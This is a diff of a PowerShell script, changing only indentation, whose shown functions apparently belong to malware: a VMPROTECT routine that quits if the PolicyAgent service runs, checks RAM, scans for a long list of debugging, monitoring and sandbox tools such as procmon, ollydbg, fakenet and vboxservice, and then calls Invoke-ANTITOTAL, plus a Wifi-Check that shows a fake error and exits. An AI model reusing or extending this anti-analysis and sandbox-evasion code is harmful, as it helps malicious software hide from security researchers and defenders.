@@ -22,7 +22,8 @@ function Wifi-Check {
             Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('WIFI CHECK FAILED !', '', 'OK', 'Error')
             Stop-Process $pid -Force
         }
-    } catch {
+    }
+    catch {
         Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('WIFI CHECK FAILED !', '', 'OK', 'Error')
         Stop-Process $pid -Force
     }
@@ -121,7 +122,7 @@ function ram_check {
 }
 
 function VMPROTECT {
-   if (Get-Service -Name "PolicyAgent" -ErrorAction SilentlyContinue | Where-Object { $_.Status -eq "Running" }) {
+    if (Get-Service -Name "PolicyAgent" -ErrorAction SilentlyContinue | Where-Object { $_.Status -eq "Running" }) {
         Stop-Process $pid -Force
     } 	
     ram_check 
@@ -132,13 +133,13 @@ function VMPROTECT {
     }	
     $processnames = @(
         "autoruns",
-	"autoruns64",
+        "autoruns64",
         "autorunsc",
-	"autorunsc64",
+        "autorunsc64",
         "die",
         "dumpcap",
-	"etwdump",
-	"efsdump",
+        "etwdump",
+        "efsdump",
         "fakenet",
         "fiddler",
         "filemon",
@@ -153,19 +154,19 @@ function VMPROTECT {
         "lordpe",
         "ollydbg",
         "petools",
-	"portmon",
+        "portmon",
         "proc_analyzer",
         "processhacker",
         "procexp",
-	"procexp64",
+        "procexp64",
         "procmon",
         "procmon64",
-	"pyw",
+        "pyw",
         "qemu-ga",
         "qga",
         "regmon",
         "resourcehacker",
-	"sbiesvc",
+        "sbiesvc",
         "sandman",
         "scylla_x64",
         "sniff_hit",
@@ -175,7 +176,7 @@ function VMPROTECT {
         "tcpdump",
         "tcpview",
         "tcpview64",
-	"udpdump",
+        "udpdump",
         "vboxcontrol",
         "vboxservice",
         "vboxtray",
@@ -198,7 +199,7 @@ function VMPROTECT {
     }
 
     if ($null -eq $detectedProcesses) {	
-	    Invoke-ANTITOTAL
+        Invoke-ANTITOTAL
         Write-Host "[!] NOT A VIRTUALIZED ENVIRONMENT !" -ForegroundColor Green
     }
 }
